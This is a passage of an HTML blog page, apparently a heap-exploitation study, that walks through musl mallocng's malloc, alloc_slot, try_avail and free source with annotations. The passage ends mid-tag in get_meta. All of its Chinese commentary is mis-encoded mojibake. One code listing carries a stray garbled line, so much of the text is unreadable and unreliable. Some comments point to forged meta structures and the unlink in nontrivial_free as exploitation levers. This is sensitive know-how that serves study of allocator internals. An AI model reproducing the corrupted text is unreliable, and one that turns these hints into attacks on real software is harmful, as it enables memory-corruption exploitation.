title="è¡¥å……ï¼šéƒ¨åˆ†é‡è¦å‡½æ•°æºç "></a>è¡¥å……ï¼šéƒ¨åˆ†é‡è¦å‡½æ•°æºç </h2><h3 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">// æœ€å¤§ç”³è¯·ç©ºé—´é™åˆ¶</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line">    <span class="type">uint32_t</span> mask, first;</span><br><span class="line">    <span class="type">int</span> sc;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> ctr;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;<span class="comment">// size &gt;= é˜ˆå€¼ ä¼šç›´æ¥é€šè¿‡mmap ç”³è¯·ç©ºé—´</span></span><br><span class="line">        <span class="type">size_t</span> needed = n + IB + UNIT; <span class="comment">//UNIT 0x10 IB 4 å®šä¹‰åœ¨meta.h é‡Œ è¿™é‡ŒUNIT + IB æ˜¯ä¸€ä¸ªåŸºæœ¬å¤´çš„å¤§å°</span></span><br><span class="line">        <span class="type">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);<span class="comment">//æ–°mmap group ç©ºé—´</span></span><br><span class="line">        <span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        wrlock();</span><br><span class="line">        step_seq();</span><br><span class="line">        g = alloc_meta();</span><br><span class="line">        <span class="keyword">if</span> (!g) &#123; <span class="comment">// å¦‚æœç”³è¯·meta å¤±è´¥ ä¼šæŠŠåˆšåˆšmmap å‡ºæ¥çš„group å›æ”¶</span></span><br><span class="line">            unlock();</span><br><span class="line">            munmap(p, needed);<span class="comment">// å›æ”¶group</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        g-&gt;mem = p;<span class="comment">// mem = group åœ°å€</span></span><br><span class="line">        g-&gt;mem-&gt;meta = g; <span class="comment">//group å¤´éƒ¨ æŒ‡å‘meta (g ä¸º meta)</span></span><br><span class="line">        g-&gt;last_idx = <span class="number">0</span>;<span class="comment">//mmapçš„group last_idxé»˜è®¤å€¼=0</span></span><br><span class="line">        g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">        g-&gt;sizeclass = <span class="number">63</span>; <span class="comment">// mmap çš„ç”³è¯·çš„ sizeclass éƒ½ä¸º63</span></span><br><span class="line">        g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">        g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line">        ctx.mmap_counter++;<span class="comment">// mmap å†…å­˜è®°è½½æ•°é‡++</span></span><br><span class="line">        idx = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> success;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¦åˆ™ç›´æ¥æ ¹æ®ä¼ å…¥sizeï¼Œè½¬æ¢æˆsize_classesçš„å¯¹åº”å¤§å°çš„ ä¸‹æ ‡ï¼Œ</span></span><br><span class="line">    sc = size_to_class(n);</span><br><span class="line"> </span><br><span class="line">    rdlock();</span><br><span class="line">    g = ctx.active[sc]; <span class="comment">// ä»ç°æœ‰çš„activeä¸­å–å‡ºå¯¹åº”sc çš„ meta ,ä¸åŒsc å¯¹åº”ä¸åŒçš„meta</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    å¦‚æœä»ctx.active ä¸­æ²¡æ‰¾åˆ°å¯¹åº”çš„meta ä¼šæ‰§è¡Œä¸‹é¢çš„ifåˆ†æ”¯</span></span><br><span class="line"><span class="comment">    è¿™é‡Œ!g&lt;=&gt; g==0 ,è¯´æ˜ctx.active[sc] æ²¡æœ‰å¯¹åº”çš„meta</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">        <span class="type">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];<span class="comment">// å¦‚æœåœ¨ ctx.active æ²¡æ‰¾åˆ° å°±ä½¿ç”¨æ›´å¤§size group çš„meta</span></span><br><span class="line">        <span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line">        <span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line">        <span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">            &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">            usage += <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">            sc |= <span class="number">1</span>;</span><br><span class="line">        g = ctx.active[sc];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">        first = mask&amp;-mask;</span><br><span class="line">        <span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">            g-&gt;avail_mask = mask-first;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        idx = a_ctz_32(first);</span><br><span class="line">        <span class="keyword">goto</span> success;</span><br><span class="line">    &#125;</span><br><span class="line">    upgradelock();</span><br><span class="line"> </span><br><span class="line">    idx = alloc_slot(sc, n);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  å¦‚æœå½“å‰group ä¸æ»¡è¶³å°±ä¼šæ¥åˆ°è¿™é‡Œ:</span></span><br><span class="line"><span class="comment">      alloc_slot ä»group ä¸­å–å‡ºå¯¹åº”å¤§å°chunk çš„idx</span></span><br><span class="line"><span class="comment">      è¿™é‡Œå…ˆä»å¯¹åº”sc çš„ctx.active[sc] ä¸­æ‰¾å¯¹åº”çš„metaçš„group æœ‰æ— ç©ºé—²chunkå¯ä»¥ä½¿ç”¨</span></span><br><span class="line"><span class="comment">        å†ä»é˜Ÿåˆ—ä¸­å…¶ä»–metaçš„group ä¸­æ‰¾</span></span><br><span class="line"><span class="comment">      å¦‚æœé˜Ÿåˆ—ä¸­å…¶ä»–metaçš„group æœ‰å¯åˆ©ç”¨çš„chunk,å°±ä½¿ç”¨</span></span><br><span class="line"><span class="comment">      å¦‚æœæ²¡æœ‰å°±é‡æ–°åˆ†é…ä¸€ä¸ªæ–°çš„group</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        unlock();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    g = ctx.active[sc];<span class="comment">// å–å‡º sc å¯¹åº”active meta</span></span><br><span class="line"> </span><br><span class="line">success:</span><br><span class="line">    ctr = ctx.mmap_counter;</span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">return</span> enframe(g, idx, n, ctr);<span class="comment">// ä»å¯¹åº”meta ä¸­çš„group å–å‡º ç¬¬idxå·chunk  n = size</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>!!! å…³é”®: ä¸€èˆ¬åˆ†é…å…ˆè¿›å…¥è¿™ä¸ªå¾ªç¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    mask = g ? g-&gt;avail_mask : <span class="number">0</span>; <span class="comment">//å…ˆæ£€æŸ¥gæ‰€æŒ‡metaæ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨mask = g-&gt;avail_mask</span></span><br><span class="line">    first = mask&amp;-mask;                     <span class="comment">//è¿™é‡Œåªæœ‰mask=0æ—¶ï¼Œfirstæ‰ä¼šä¸º0</span></span><br><span class="line">    <span class="keyword">if</span> (!first) <span class="keyword">break</span>;                        <span class="comment">//maskä¸º0ï¼Œfirst=0ï¼Œæ— å¯ç”¨ç©ºé—²chunkï¼Œè·³å‡ºå¾ªç¯</span></span><br><span class="line">    <span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)<span class="comment">//å¦‚æœæ˜¯æ’å®ƒé”, é‚£ä¹ˆä¸‹é¢ä¿è¯æˆåŠŸ</span></span><br><span class="line">        g-&gt;avail_mask = mask-first;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask) <span class="comment">//æˆåŠŸæ‰¾åˆ°å¹¶è®¾ç½®avail_maskä¹‹å,continue åè®¾ç½®idxï¼Œç„¶åè·³å‡º</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    idx = a_ctz_32(first);</span><br><span class="line">    <span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br><span class="line">    upgradelock();</span><br><span class="line">    å¦‚æœ</span><br><span class="line"> </span><br><span class="line">    idx = alloc_slot(sc, n);</span><br></pre></td></tr></table></figure><p>alloc_slot:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_slot</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span></span><br><span class="line">&#123;    <span class="comment">// å°è¯•ä»é™åˆ¶active ä¸­æ‰¾åˆ°åˆé€‚å¯ç”¨çš„</span></span><br><span class="line">    <span class="type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line">    <span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å¦‚æœæ²¡æ‰¾åˆ° é‡æ–°åˆ›é€ ä¸€ä¸ªmetaï¼Œç„¶åé‡æ–°åˆ†é…ä¸€ä¸ªsizeå¤§å°å¯¹åº”scçš„groupï¼Œç»™è¿™ä¸ªæ–°åˆ†é…çš„meta</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line">    <span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">    g-&gt;avail_mask--;</span><br><span class="line">    <span class="built_in">queue</span>(&amp;ctx.active[sc], g); <span class="comment">//æŠŠæ–°meta åŠ å…¥é˜Ÿåˆ—</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>try_avail:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">try_avail</span><span class="params">(<span class="keyword">struct</span> meta **pm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line">    <span class="type">uint32_t</span> first;</span><br><span class="line">    <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line">    <span class="keyword">if</span> (!mask)<span class="comment">//mask = m-&gt;avail_mask (!mask) è¡¨ç¤ºæ²¡æœ‰å¯ç”¨çš„chunkäº†</span></span><br><span class="line">    &#123;                                        </span><br><span class="line">        <span class="keyword">if</span> (!m-&gt;freed_mask) <span class="comment">// if (!m-&gt;freed_mask) &lt;=&gt; æ²¡æœ‰å·²ç»é‡Šæ”¾çš„chunk</span></span><br><span class="line">        &#123;                                </span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">       è¿›å…¥è¿™ä¸ªåˆ†æ”¯çš„æ¡ä»¶:æ—¢æ²¡æœ‰å¯ç”¨çš„chunkï¼Œä¹Ÿæ²¡æœ‰è¢«é‡Šæ”¾è¿˜æœªå›æ”¶çš„chunkï¼Œå³chunkéƒ½è¢«ä½¿ç”¨ï¼Œä¸”éƒ½æ²¡è¢«é‡Šæ”¾</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">            dequeue(pm, m); <span class="comment">// freed_mask==avail_mask=0, group ç©ºé—´å·²æ»¡ è®©å¯¹åº”çš„meta å‡ºé˜Ÿ</span></span><br><span class="line">            m = *pm;</span><br><span class="line">            <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        è¿™é‡Œelseè¡¨ç¤ºçš„æ˜¯:æ— å¯ç”¨ç©ºé—²chunkï¼Œä½†æ˜¯æœ‰å·²ç»é‡Šæ”¾çš„chunk</span></span><br><span class="line"><span class="comment">        !!! freeé‡Šæ”¾çš„chunk ä¸èƒ½é©¬ä¸Šè¢«å¤ç”¨çš„ !!!</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">       è¿›å…¥è¿™ä¸ªåˆ†æ”¯çš„æ¡ä»¶:æ²¡æœ‰å¯ç”¨çš„chunkï¼Œæœ‰è¢«é‡Šæ”¾è¿˜æœªå›æ”¶çš„chunkã€‚</span></span><br><span class="line"><span class="comment">       æœ‰ç‚¹å¥½å¥‡è¿™é‡Œï¼Œå¦‚æœè¾¾æˆè¿™ä¸ªæ¡ä»¶ï¼Œç„¶ååˆ©ç”¨æŒ‡é’ˆäº’å†™ï¼Œä¿®æ”¹m-&gt;next ä¼ªé€ çš„metaï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥åˆ¶é€ fake meta å…¥é˜Ÿçš„å‡è±¡</span></span><br><span class="line"><span class="comment">       è‹¥metaé“¾è¡¨ä¸­æ²¡æœ‰ï¼Œä¸€èˆ¬meta çš„nextå’Œprev éƒ½æ˜¯æŒ‡å‘è‡ªå·±</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        mask = m-&gt;freed_mask;</span><br><span class="line">        <span class="comment">// å¦‚æœè¿™ä¸ªmeta çš„group åªå«æœ‰ä¸€ä¸ªchunk ï¼Œä¸”è¢«é‡Šæ”¾å°±è·³è¿‡ï¼Œ</span></span><br><span class="line">        <span class="comment">// æˆ–è€… è¿™ä¸ªmeta çš„group æ ¹æœ¬ä¸èƒ½è¢«é‡Šæ”¾ å¦‚mmap çš„ group last_idx = 0 freeable=1</span></span><br><span class="line">        <span class="keyword">if</span> (mask == (<span class="number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="number">-1</span> &amp;&amp; m-&gt;freeable)</span><br><span class="line">        &#123;</span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">            mask = m-&gt;freed_mask;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line">        <span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line">        <span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line">        <span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">        <span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (m-&gt;next != m)</span><br><span class="line">            &#123; <span class="comment">// å¦‚æœè¿™ä¸ªmeta åè¿˜æœ‰meta å°±åˆ‡æ¢åˆ° ä¸‹ä¸€ä¸ªmeta</span></span><br><span class="line">                m = m-&gt;next;</span><br><span class="line">                *pm = m;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line">                <span class="type">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;</span><br><span class="line">                <span class="type">int</span> span = UNIT + size*cnt;</span><br><span class="line">                <span class="comment">// activate up to next 4k boundary</span></span><br><span class="line">                <span class="keyword">while</span> ((span^(span+size<span class="number">-1</span>)) &lt; <span class="number">4096</span>) <span class="comment">// é¡µå¯¹é½</span></span><br><span class="line">                &#123;</span><br><span class="line">                    cnt++;</span><br><span class="line">                    span += size;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="number">1</span>)</span><br><span class="line">                    cnt = m-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">                m-&gt;mem-&gt;active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        mask = activate_group(m);<span class="comment">// è¿™é‡Œæ˜¯ç»™ mçš„ avail_mask æ‰“ä¸Šæ ‡è®°</span></span><br><span class="line">        assert(mask);</span><br><span class="line">        decay_bounces(m-&gt; sizeclass);</span><br><span class="line">    &#125;</span><br><span class="line">    first = mask&amp;-mask; <span class="comment">// è‹¥ mask%2==0 åˆ™first =ç»“æœæ˜¯èƒ½æ•´é™¤è¿™ä¸ªå¶æ•°çš„æœ€å¤§çš„2çš„å¹‚ è‹¥ mask%2==1 åˆ™firstæ°¸è¿œä¸º1</span></span><br><span class="line">    m-&gt;avail_mask = mask-first;</span><br><span class="line">    <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="free-1"><a href="#free-1" class="headerlink" title="free:"></a>free:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);<span class="comment">// é€šè¿‡chunk p ç”¨get_metaå¾—åˆ°å¯¹åº”çš„meta</span></span><br><span class="line">    <span class="type">int</span> idx = get_slot_index(p);<span class="comment">// å¾—åˆ°å¯¹åº”chunkçš„ idx</span></span><br><span class="line">    <span class="type">size_t</span> stride = get_stride(g); <span class="comment">// å¾—åˆ°sizeclasses ä¸­å¯¹åº”chunkç±»å‹çš„size</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *end = start + stride - IB;</span><br><span class="line">    <span class="comment">//*start = g-&gt;mem-&gt;storage(å¾—åˆ°groupä¸­ç¬¬ä¸€ä¸ªchunkåœ°å€) + stride*idx(åŠ ä¸Šå¯¹åº”chunkåç§»);</span></span><br><span class="line">    <span class="comment">// start å°±ä¸ºå¯¹åº”p(chunk)çš„èµ·å§‹åœ°å€</span></span><br><span class="line">    <span class="comment">// end å¯¹åº”ç»“æŸåœ°å€</span></span><br><span class="line"> </span><br><span class="line">    get_nominal_size(p, end);<span class="comment">//ç®—å‡ºçœŸå®å¤§å°</span></span><br><span class="line">    <span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;<span class="comment">//è®¾ç½®bitmap æ ‡å¿—</span></span><br><span class="line">    ((<span class="type">unsigned</span> <span class="type">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line">    *(<span class="type">uint16_t</span> *)((<span class="type">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (((<span class="type">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="type">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> *base = start + (-(<span class="type">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line">        <span class="type">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line">        <span class="keyword">if</span> (len) madvise(base, len, MADV_FREE);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">        <span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">        <span class="type">uint32_t</span> mask = freed | avail; <span class="comment">// å°†é‡Šæ”¾çš„chunk å’Œ ç°åœ¨å¯ç”¨çš„ chunk åŠ èµ·æ¥</span></span><br><span class="line">        assert(!(mask&amp;self));</span><br><span class="line">        <span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//!freed æ²¡æœ‰è¢«é‡Šæ”¾çš„chunkï¼Œmask+self==allè¯´æ˜é‡Šæ”¾äº†å½“å‰chunkæ‰€æœ‰chunk éƒ½å°†è¢«å›æ”¶</span></span><br><span class="line">        <span class="comment">// æ­¤group ä¼šè¢«å¼¹å‡ºé˜Ÿåˆ—</span></span><br><span class="line">        <span class="keyword">if</span> (!MT)</span><br><span class="line">            g-&gt;freed_mask = freed+self;<span class="comment">// è®¾ç½®free_mask è¡¨ç¤ºchunk è¢«é‡Šæ”¾</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    wrlock();</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);<span class="comment">// å«æœ‰meta æ“ä½œ ï¼Œå†…æœ‰unlink æ˜¯æ¼æ´åˆ©ç”¨çš„å…³é”®</span></span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">if</span> (mi.len) munmap(mi.base, mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="get-meta"><a href="#get-meta" class="headerlink" title="get_meta:"></a>get_meta:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span 